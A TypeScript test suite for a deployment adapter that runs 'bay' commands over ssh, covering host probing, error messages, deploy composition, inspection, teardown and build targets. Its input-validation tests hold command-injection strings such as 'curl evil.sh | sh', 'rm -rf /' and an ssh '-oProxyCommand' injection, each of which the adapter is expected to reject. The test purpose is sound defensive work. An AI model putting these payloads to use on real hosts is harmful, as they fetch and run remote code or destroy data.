import { Alepha, AlephaError } from "alepha";
import { type BuildTarget, buildOptions } from "alepha/cli";
import type { RunnerMethod } from "alepha/command";
import {
  FileSystemProvider,
  MemoryFileSystemProvider,
  MemoryShellProvider,
  ShellProvider,
} from "alepha/system";
import { describe, expect, it } from "vitest";
import { BayAdapter } from "../adapters/BayAdapter.ts";
import type { PlatformContext } from "../adapters/PlatformAdapter.ts";

/**
 * Runs a task's handler straight through.
 *
 * What these tests are about is the command the adapter composes, not how the
 * step is reported.
 */
const run: RunnerMethod = (async (task: { handler: () => Promise<unknown> }) =>
  await task.handler()) as unknown as RunnerMethod;

const context = (overrides: Partial<PlatformContext> = {}): PlatformContext =>
  ({
    project: "demo",
    env: "production",
    root: "/project",
    envConfig: { adapter: "bay", host: "deploy@bay.example.com" },
    ...overrides,
  }) as unknown as PlatformContext;

const setup = async () => {
  const alepha = Alepha.create()
    .with({ provide: FileSystemProvider, use: MemoryFileSystemProvider })
    .with({ provide: ShellProvider, use: MemoryShellProvider });
  const fs = alepha.inject(MemoryFileSystemProvider);
  await fs.writeFile("/project/yarn.lock", "");
  // `alepha pack` is a recorded no-op under MemoryShellProvider, so the
  // artifact it "produced" has to exist for the deploy step to find it.
  await fs.writeFile("/project/demo-latest.tar.gz", "TARBALL");
  return {
    alepha,
    adapter: alepha.inject(BayAdapter),
    shell: alepha.inject(MemoryShellProvider),
    fs,
  };
};

/**
 * Exposes the protected `quote` method for a direct test.
 *
 * Every real caller pre-validates its arguments via `assertSafe` before they
 * ever reach `quote`, so its own escaping is unreachable from any behavioral
 * test in this file — this is the one test that would actually go red if the
 * escaping itself broke.
 */
class QuotingBayAdapter extends BayAdapter {
  public testQuote(value: string): string {
    return this.quote(value);
  }
}

describe("BayAdapter — the host it deploys to", () => {
  it("refuses to guess when no host is configured", async () => {
    const { adapter } = await setup();

    await expect(
      adapter.authenticate(context({ envConfig: { adapter: "bay" } }), run),
    ).rejects.toThrowError(/No Bay host for environment "production"/);
  });

  it("names both fixes, so neither has to be guessed", async () => {
    const { adapter } = await setup();

    await expect(
      adapter.authenticate(context({ envConfig: { adapter: "bay" } }), run),
    ).rejects.toThrowError(/alepha\.config\.ts[\s\S]*BAY_HOST/);
  });

  it("takes $BAY_HOST over the config, so CI needs no edit", async () => {
    const { adapter, shell } = await setup();
    process.env.BAY_HOST = "ci@other.example.com";
    try {
      await adapter.authenticate(context(), run);
    } finally {
      delete process.env.BAY_HOST;
    }

    expect(
      shell.wasCalled("ssh -o BatchMode=yes ci@other.example.com bay list"),
    ).toBe(true);
  });

  it("probes with `bay list`, which reaches the control socket — `bay version` does not", async () => {
    // On the Go side, "version" is `fmt.Println(version)`: a local constant,
    // printed without ever dialing the control socket. Probing with it would
    // prove only that ssh works and `bay` is on PATH — every wrong `socket`
    // path, missing group membership, or `bay serve` being down would all
    // survive it and only surface after a full build and pack.
    const { adapter, shell } = await setup();

    await adapter.authenticate(context(), run);

    expect(
      shell.wasCalled("ssh -o BatchMode=yes deploy@bay.example.com bay list"),
    ).toBe(true);
  });
});

describe("BayAdapter — what it refuses to put on a command line", () => {
  /*
    `ssh` joins its command arguments into ONE string and hands it to the
    remote login shell, so the local argv-array form protects nothing on the
    far side. A domain of "a.com; rm -rf /" would run as two commands.

    Every case below asserts `shell.calls` is EMPTY rather than just that a
    throw happened — a future refactor that validates after composing would
    still pass a throw-only assertion while having already built the string.
  */
  it("refuses an app name carrying a shell metacharacter", async () => {
    const { adapter, shell } = await setup();

    await expect(
      adapter.teardown(context({ project: "demo; rm -rf /" }), run),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("refuses an environment carrying a shell metacharacter", async () => {
    const { adapter, shell } = await setup();

    await expect(
      adapter.teardown(context({ env: "prod$(whoami)" }), run),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("refuses a domain carrying a shell metacharacter", async () => {
    const { adapter, shell } = await setup();

    await expect(
      adapter.deploy(
        context({
          envConfig: {
            adapter: "bay",
            host: "deploy@bay.example.com",
            domain: "app.com; curl evil.sh | sh",
          },
        }),
        run,
      ),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("refuses a host that would be read as an ssh option", async () => {
    // Argument injection, not shell injection: a "host" of
    // -oProxyCommand=... is consumed by ssh itself, before any remote shell
    // exists. OpenSSH has no reliable `--`, so the pattern is the defence.
    const { adapter, shell } = await setup();

    await expect(
      adapter.authenticate(
        context({
          envConfig: {
            adapter: "bay",
            host: "-oProxyCommand=curl evil.sh|sh",
          },
        }),
        run,
      ),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("refuses a wildcard domain rather than shipping one Bay cannot serve", async () => {
    // Bay answers ACME over HTTP-01 / TLS-ALPN, neither of which can prove a
    // wildcard. Passing it through would fail on the host with a certificate
    // error naming nothing about this config.
    const { adapter, shell } = await setup();

    await expect(
      adapter.deploy(
        context({
          envConfig: {
            adapter: "bay",
            host: "deploy@bay.example.com",
            domain: "*.demo.example.com",
          },
        }),
        run,
      ),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("refuses a control socket path carrying a shell metacharacter", async () => {
    const { adapter, shell } = await setup();

    await expect(
      adapter.deploy(
        context({
          envConfig: {
            adapter: "bay",
            host: "deploy@bay.example.com",
            socket: "/var/lib/bay/control.sock; rm -rf /",
          },
        }),
        run,
      ),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("names the value and the rule, not just 'invalid'", async () => {
    const { adapter } = await setup();

    await expect(
      adapter.teardown(context({ project: "demo; rm -rf /" }), run),
    ).rejects.toThrowError(/demo; rm -rf \//);
  });
});

describe("BayAdapter — the deploy it composes", () => {
  it("pipes the packed artifact into `bay deploy -`", async () => {
    const { adapter, shell } = await setup();

    await adapter.deploy(context(), run);

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com " +
          "bay deploy - --name demo --env production",
      ),
    ).toBe(true);
  });

  it("sends the artifact bytes on stdin, not a path", async () => {
    const { adapter, shell } = await setup();

    await adapter.deploy(context(), run);

    const [call] = shell.getCallsMatching(/bay deploy -/);
    const sent = call.options.stdin as Uint8Array;
    expect(new TextDecoder().decode(sent)).toBe("TARBALL");
  });

  it("packs before it deploys, and refuses if nothing was produced", async () => {
    const { adapter, fs } = await setup();
    await fs.rm("/project/demo-latest.tar.gz");

    await expect(adapter.deploy(context(), run)).rejects.toThrowError(
      /alepha pack. produced no/,
    );
  });

  it("passes a configured domain", async () => {
    const { adapter, shell } = await setup();

    await adapter.deploy(
      context({
        envConfig: {
          adapter: "bay",
          host: "deploy@bay.example.com",
          domain: "app.example.com",
        },
      }),
      run,
    );

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com " +
          "bay deploy - --name demo --env production --domain app.example.com",
      ),
    ).toBe(true);
  });

  it("repeats --domain for a comma-separated list", async () => {
    // An apex and its www are one site, and a value pasted out of a config
    // file arrives comma-separated. Bay accepts both shapes; sending one flag
    // per host is the one that cannot be misparsed.
    const { adapter, shell } = await setup();

    await adapter.deploy(
      context({
        envConfig: {
          adapter: "bay",
          host: "deploy@bay.example.com",
          domain: "example.com, www.example.com",
        },
      }),
      run,
    );

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com " +
          "bay deploy - --name demo --env production " +
          "--domain example.com --domain www.example.com",
      ),
    ).toBe(true);
  });

  it("returns the URL Bay reported", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        [[
          "ssh",
          "-o",
          "BatchMode=yes",
          "deploy@bay.example.com",
          "bay deploy - --name demo --env production",
        ].join(" ")]: JSON.stringify({ url: "https://demo.bay.example.com/" }),
      },
    });

    expect(await adapter.deploy(context(), run)).toBe(
      "https://demo.bay.example.com/",
    );
  });

  it("reports no URL rather than a link built from a non-JSON answer", async () => {
    // Anything but JSON means something other than `bay deploy` answered.
    // Turning that into a link is how `up` finishes green pointing at nothing.
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        [[
          "ssh",
          "-o",
          "BatchMode=yes",
          "deploy@bay.example.com",
          "bay deploy - --name demo --env production",
        ].join(" ")]: "-bash: bay: command not found",
      },
    });

    expect(await adapter.deploy(context(), run)).toBeUndefined();
  });
});

describe("BayAdapter — the control socket it can be told about", () => {
  /*
    Bay's default root is the RELATIVE path `./bay-data`, and an ssh command
    runs non-interactively with cwd = $HOME, so on any host whose root is not
    `$HOME/bay-data` — every `--root /var/lib/bay` install included — Bay's
    own guess at the socket misses. `$BAY_SOCKET` on the remote host is Bay's
    escape hatch, but a non-interactive ssh command reads neither
    `~/.profile` nor, on Debian/Ubuntu's default, `~/.bashrc`, so there is
    nowhere reliable to export it from. `--control-socket` on every `bay`
    invocation sidesteps needing a remote shell profile at all.
  */
  const socketContext = () =>
    context({
      envConfig: {
        adapter: "bay",
        host: "deploy@bay.example.com",
        socket: "/var/lib/bay/control.sock",
      },
    });

  it("appends --control-socket to the deploy command when one is configured", async () => {
    const { adapter, shell } = await setup();

    await adapter.deploy(socketContext(), run);

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com " +
          "bay deploy - --name demo --env production " +
          "--control-socket /var/lib/bay/control.sock",
      ),
    ).toBe(true);
  });

  it("appends --control-socket to `bay list` and `bay remove` too", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list --control-socket /var/lib/bay/control.sock":
          "[]",
      },
    });

    await adapter.inspect(socketContext(), run);
    await adapter.teardown(socketContext(), run);

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com bay list --control-socket /var/lib/bay/control.sock",
      ),
    ).toBe(true);
    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com bay remove demo/production --control-socket /var/lib/bay/control.sock",
      ),
    ).toBe(true);
  });

  it("never puts --control-socket on `id -nG`, which is not a bay command", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com id -nG":
          "deploy docker bay-control",
        "ssh -o BatchMode=yes deploy@bay.example.com bay list --control-socket /var/lib/bay/control.sock":
          "[]",
      },
    });

    await expect(adapter.login(socketContext(), run)).resolves.toBeUndefined();

    // The bare form, with no flag at all — not merely "some call happened".
    expect(
      shell.wasCalled("ssh -o BatchMode=yes deploy@bay.example.com id -nG"),
    ).toBe(true);
  });
});

describe("BayAdapter — what it says when ssh fails", () => {
  const failWith = async (message: string) => {
    const { adapter, shell } = await setup();
    shell.configure({
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list": message,
      },
    });
    return adapter.authenticate(context(), run);
  };

  it("names the key when the host refused it", async () => {
    await expect(
      failWith("Permission denied (publickey)."),
    ).rejects.toThrowError(/authorized_keys/);
  });

  it("says to set `socket`, not to fix group membership, when Bay never found any socket at all", async () => {
    // "no control socket found" means Bay never even tried to dial anything —
    // nothing was passed via --control-socket and its own relative-path guess
    // found no file. That is a config problem, not a group problem: the
    // genuine group failure looks completely different (below) and gets its
    // own, different advice.
    await expect(
      failWith("no control socket found — these commands run on the Bay host"),
    ).rejects.toThrowError(/never found its own control socket/);
  });

  it("names the PATH when bay is not installed for that user", async () => {
    await expect(failWith("bash: bay: command not found")).rejects.toThrowError(
      /PATH/,
    );
  });

  it("also recognizes dash's 'not found' phrasing for a missing PATH entry", async () => {
    // dash's login shell says "bay: not found", never "command not found".
    await expect(failWith("bay: not found")).rejects.toThrowError(/PATH/);
  });

  it("names the control group when the socket denies that specific user", async () => {
    // The failure that wastes an afternoon: the key works, the shell opens,
    // and Bay found the socket file (its directory is world-readable) but
    // refused to dial it for this user specifically. This wording is
    // identical to an SSH key refusal, so this fixture carries BOTH patterns
    // and would go red if the branches were checked in the other order (the
    // permission/publickey branch would win instead and report the wrong fix).
    await expect(
      failWith(
        "control api unreachable (is `bay serve` running?): " +
          "dial unix /var/lib/bay/control.sock: connect: permission denied",
      ),
    ).rejects.toThrowError(/usermod -aG bay-control/);
  });

  it("names an old bay's stdin limitation, not a PATH problem", async () => {
    // `open -: no such file or directory` is what a `bay` from before "-"
    // meant stdin produces: `os.Open("-")` fails just like any other missing
    // file. It contains "no such file or directory", so this fails if the
    // upgrade-bay branch were checked after the generic PATH one.
    await expect(
      failWith("error: open -: no such file or directory"),
    ).rejects.toThrowError(/too old to read the deploy artifact from stdin/);
  });

  it("names a bad `socket` value, not a PATH problem", async () => {
    // A `socket` pointing at nothing produces this exact wording, which also
    // contains "no such file or directory" — so this fails if the
    // socket-config branch were checked after the generic PATH one.
    await expect(
      failWith(
        "control api unreachable (is `bay serve` running?): " +
          "dial unix /var/lib/bay/wrong.sock: connect: no such file or directory",
      ),
    ).rejects.toThrowError(
      /nothing is listening at the configured control socket path/,
    );
  });
});

describe("BayAdapter — inspect", () => {
  const listing = (body: string) => async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list": body,
      },
    });
    return adapter.inspect(context(), run);
  };

  it("reads the canonical host out of `domains`, not the legacy `domain`", async () => {
    /*
      `state.App.Domains` is the live field — a list, canonical first, because
      an apex and its www are one site. `domain` is `LegacyDomain`, folded into
      `Domains` and cleared on load, so it is absent from anything a current
      Bay writes. Reading it reported `undefined` for every app.
    */
    const state = await listing(
      JSON.stringify([
        {
          name: "demo",
          env: "production",
          domains: ["demo.example.com", "www.demo.example.com"],
          release: "r-42",
        },
      ]),
    )();

    expect(state.workers).toEqual([
      {
        name: "demo/production",
        exists: true,
        detail: "demo.example.com",
        version: "r-42",
      },
    ]);
  });

  it("still reads a legacy `domain` from a host that has not been upgraded", async () => {
    const state = await listing(
      JSON.stringify([
        {
          name: "demo",
          env: "production",
          domain: "old.example.com",
          release: "r-1",
        },
      ]),
    )();

    expect(state.workers[0].detail).toBe("old.example.com");
  });

  it("reports only this project and this environment", async () => {
    const state = await listing(
      JSON.stringify([
        {
          name: "demo",
          env: "staging",
          domains: ["s.example.com"],
          release: "r-1",
        },
        {
          name: "other",
          env: "production",
          domains: ["o.example.com"],
          release: "r-2",
        },
        {
          name: "demo",
          env: "production",
          domains: ["d.example.com"],
          release: "r-3",
        },
      ]),
    )();

    expect(state.workers).toHaveLength(1);
    expect(state.workers[0].version).toBe("r-3");
  });

  it("survives a Bay with nothing deployed", async () => {
    // `bay list` marshals a nil slice as `null`, not `[]`. Calling .filter on
    // that throws, and the message names neither Bay nor the empty host.
    const state = await listing("null")();

    expect(state.workers).toEqual([]);
  });

  it("reports empty resource lists rather than inventing them", async () => {
    // Bay provisions from the manifest and exposes no inventory. Synthesising
    // entries from the manifest would report intent as fact.
    const state = await listing("[]")();

    expect(state.databases).toEqual([]);
    expect(state.buckets).toEqual([]);
    expect(state.secrets).toEqual([]);
  });

  it("names the fix rather than printing a raw shell error when ssh itself fails", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list":
          "Permission denied (publickey).",
      },
    });

    await expect(adapter.inspect(context(), run)).rejects.toThrowError(
      /authorized_keys/,
    );
  });

  it("names the host rather than dying on a non-JSON answer", async () => {
    // A non-JSON answer means something other than `bay list` responded — a
    // login banner, a stray shell error. The same reasoning `deployedUrl`
    // already applies to `bay deploy`.
    await expect(
      listing("-bash: bay: command not found")(),
    ).rejects.toThrowError(/bay list.*something other than JSON/);
  });
});

describe("BayAdapter — teardown", () => {
  it("removes the app and says the data stayed behind", async () => {
    const { adapter, shell } = await setup();

    await adapter.teardown(context(), run);

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com bay remove demo/production",
      ),
    ).toBe(true);
  });

  it("treats an app that was never deployed as done, not as a failure", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay remove demo/production":
          "404 Not Found: unknown app demo/production",
      },
    });

    await expect(adapter.teardown(context(), run)).resolves.toBeUndefined();
  });

  it("treats a genuine failure as a failure even when the app name contains '404'", async () => {
    // Bay echoes the app name back in its errors. A project legitimately
    // named "app404" must not have an unrelated removal failure misread as
    // "already removed" merely because its own name contains those digits.
    const { adapter, shell } = await setup();
    shell.configure({
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay remove app404/production":
          "failed to remove app404/production: internal server error",
      },
    });

    await expect(
      adapter.teardown(context({ project: "app404" }), run),
    ).rejects.toThrowError(/ssh to deploy@bay\.example\.com failed/);
  });
});

describe("BayAdapter — login and logout", () => {
  it("confirms the group membership deploys actually depend on", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com id -nG":
          "deploy docker bay-control",
        "ssh -o BatchMode=yes deploy@bay.example.com bay list": "[]",
      },
    });

    await expect(adapter.login(context(), run)).resolves.toBeUndefined();
  });

  it("earns its 'deploys will be accepted' claim with a real socket round trip", async () => {
    // `id -nG` alone cannot prove the socket is reachable — only a genuine
    // `bay list` call can. If `login` stopped calling it, this is the test
    // that would notice.
    const { adapter, shell } = await setup();
    shell.configure({
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list":
          "control api unreachable (is `bay serve` running?): " +
          "dial unix /var/lib/bay/control.sock: connect: permission denied",
      },
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com id -nG":
          "deploy docker bay-control",
      },
    });

    await expect(adapter.login(context(), run)).rejects.toThrowError(
      /usermod -aG bay-control/,
    );
    expect(
      shell.wasCalled("ssh -o BatchMode=yes deploy@bay.example.com bay list"),
    ).toBe(true);
  });

  it("says what to run when the key works but the group does not", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com id -nG": "deploy docker",
      },
    });

    await expect(adapter.login(context(), run)).rejects.toThrowError(
      /usermod -aG bay-control/,
    );
  });

  it("checks the group before asking bay anything", async () => {
    // Ordering is the point: checking membership directly with `id -nG` is
    // faster and more portable than a round trip to the control socket that
    // would only fail predictably, so it runs first.
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com id -nG": "deploy docker",
      },
    });

    await adapter.login(context(), run).catch(() => {});

    expect(shell.calls).toHaveLength(1);
    expect(shell.calls[0].command).toContain("id -nG");
  });

  it("refuses to logout, and names where the key actually lives", async () => {
    const { adapter } = await setup();

    await expect(adapter.logout(context(), run)).rejects.toThrowError(
      /authorized_keys/,
    );
  });
});

describe("BayAdapter — the target it builds for", () => {
  /*
    `build` hardcoded `--target=bare`.

    The hardcode is load-bearing: a workerd bundle is resolved against
    Cloudflare's export conditions and has no runnable entry point, so letting
    one reach Bay produces an app that deploys, never boots, and says only
    "never became ready". But an explicit flag OVERRIDES the workspace's own
    `alepha.config.ts`, so a site declaring `target: "static"` was silently
    built as a server and shipped a bundle Bay would try to spawn.
  */
  const buildWith = async (target?: BuildTarget) => {
    // Its own container, and the store is mutated BEFORE the adapter is
    // injected — the order the previous version of this suite used, because
    // `$store` is resolved at injection.
    const alepha = Alepha.create()
      .with({ provide: FileSystemProvider, use: MemoryFileSystemProvider })
      .with({ provide: ShellProvider, use: MemoryShellProvider });
    const fs = alepha.inject(MemoryFileSystemProvider);
    await fs.writeFile("/project/yarn.lock", "");
    if (target) {
      alepha.store.mut(buildOptions, (current) => ({ ...current, target }));
    }
    const adapter = alepha.inject(BayAdapter);
    await adapter.build(context(), run);
    return alepha.inject(MemoryShellProvider);
  };

  it("should build a declared static site for the static target", async () => {
    const shell = await buildWith("static");

    expect(shell.wasCalled("yarn alepha build --target=static")).toBe(true);
  });

  it("should still force bare when nothing is declared", async () => {
    const shell = await buildWith();

    expect(shell.wasCalled("yarn alepha build --target=bare")).toBe(true);
  });

  it("should refuse to inherit a cloudflare target", async () => {
    const shell = await buildWith("cloudflare");

    expect(shell.wasCalled("yarn alepha build --target=bare")).toBe(true);
  });
});

describe("BayAdapter — the package manager it shells out to", () => {
  /*
    `yarn` was hardcoded in `build` and `pack`.

    Deploying an npm workspace therefore failed at the build step with yarn's
    own error — for lindocara, a complaint about a missing lockfile entry,
    because the project has a `package-lock.json` and no `yarn.lock`. Nothing
    in the message mentioned Bay, the adapter, or that yarn was an assumption.
  */
  const withLockfile = async (lockfile: string) => {
    const alepha = Alepha.create()
      .with({ provide: FileSystemProvider, use: MemoryFileSystemProvider })
      .with({ provide: ShellProvider, use: MemoryShellProvider });
    const fs = alepha.inject(MemoryFileSystemProvider);
    await fs.writeFile(`/project/${lockfile}`, "");
    const adapter = alepha.inject(BayAdapter);
    await adapter.build(context(), run);
    return alepha.inject(MemoryShellProvider);
  };

  it("should use yarn for a yarn workspace", async () => {
    const shell = await withLockfile("yarn.lock");

    expect(shell.wasCalled("yarn alepha build --target=bare")).toBe(true);
  });

  it("should run the binary, not a script, for an npm workspace", async () => {
    // Two ways to get this wrong, and the first fix hit the second: `npm
    // alepha …` is not a command, and `npm run alepha` looks for a
    // package.json SCRIPT by that name, which an app has no reason to declare.
    const shell = await withLockfile("package-lock.json");

    expect(shell.wasCalled("npx alepha build --target=bare")).toBe(true);
  });

  it("should use pnpm exec for a pnpm workspace", async () => {
    const shell = await withLockfile("pnpm-lock.yaml");

    expect(shell.wasCalled("pnpm exec alepha build --target=bare")).toBe(true);
  });

  it("should use bunx for a bun workspace", async () => {
    const shell = await withLockfile("bun.lock");

    expect(shell.wasCalled("bunx alepha build --target=bare")).toBe(true);
  });
});

describe("BayAdapter — quoting", () => {
  it("round-trips a value containing a single quote", async () => {
    const alepha = Alepha.create()
      .with({ provide: FileSystemProvider, use: MemoryFileSystemProvider })
      .with({ provide: ShellProvider, use: MemoryShellProvider });
    const adapter = alepha.inject(QuotingBayAdapter);

    // `'\''` closes the quote, escapes a literal `'` outside it, and reopens
    // it — the only way to put a single quote inside single-quoted shell
    // text. Every real caller pre-validates before reaching this, so nothing
    // else in this file exercises the escaping itself.
    expect(adapter.testQuote("it's a test; rm -rf /")).toBe(
      "'it'\\''s a test; rm -rf /'",
    );
  });
});
